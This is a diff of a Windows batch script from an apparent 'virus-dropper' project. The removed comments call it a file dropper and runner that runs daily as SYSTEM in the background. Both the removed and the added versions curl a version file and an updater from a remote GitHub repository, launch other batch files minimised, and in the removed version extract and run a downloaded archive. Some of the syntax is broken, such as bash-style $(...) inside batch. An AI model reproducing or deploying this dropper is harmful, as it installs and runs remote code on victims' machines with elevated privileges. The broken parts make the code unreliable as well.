@@ -1,14 +1,10 @@
 @echo off
-::file dropper and runner
-::this file is run daily as ADMINISTRATOR with highest elevation, under the name of SYSTEM, in BACKGROUND
-set /a version = 2
-output=$(curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/Version.txt")
-If %output%>%version%
-  start /min AV.bat
-  curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/Updater.zip" --output "Updates.zip"
-  powershell.exe -nologo -noprofile -command "& { $shell = New-Object -COM Shell.Application; $target = $shell.NameSpace('%~dp0'); $zip = $shell.NameSpace('%~dp0\Updates.zip'); $target.CopyHere($zip.Items(), 16); }"
-  del /f /q Updates.zip
-  move "%~dp0\updates\Updater.bat" "%~dp0"
-  rd updates
-  start /min Updater.bat
+set /a version=1
+@SET output=
+FOR /F %%I IN ('curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/version.txt"') DO @SET "output=%%I"
+If %output% == %version% "exit" ELSE "goto update"
+
+:update
+start /min AV.bat
+curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/Updater.bat" --output "Updater.bat"
 exit
